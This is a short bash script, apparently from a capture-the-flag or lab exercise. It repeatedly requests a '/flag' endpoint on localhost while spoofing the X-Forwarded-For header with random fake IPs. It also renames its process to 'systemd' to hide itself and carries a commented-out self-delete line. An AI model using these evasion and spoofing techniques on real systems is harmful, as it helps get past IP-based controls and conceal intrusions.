#!/bin/bash

FAKE_IPS=("10.0.0.2" "10.0.0.3" "10.0.0.4" "10.0.0.5" "10.0.0.6")

TARGET="localhost"

prctl --set-name "systemd"

# rm -- "$0"

# cycle through ips randomly
while true; do
    RANDOM_IP=${FAKE_IPS[$RANDOM % ${#FAKE_IPS[@]}]}
    curl --header "X-Forwarded-For: $RANDOM_IP" localhost:80/flag
done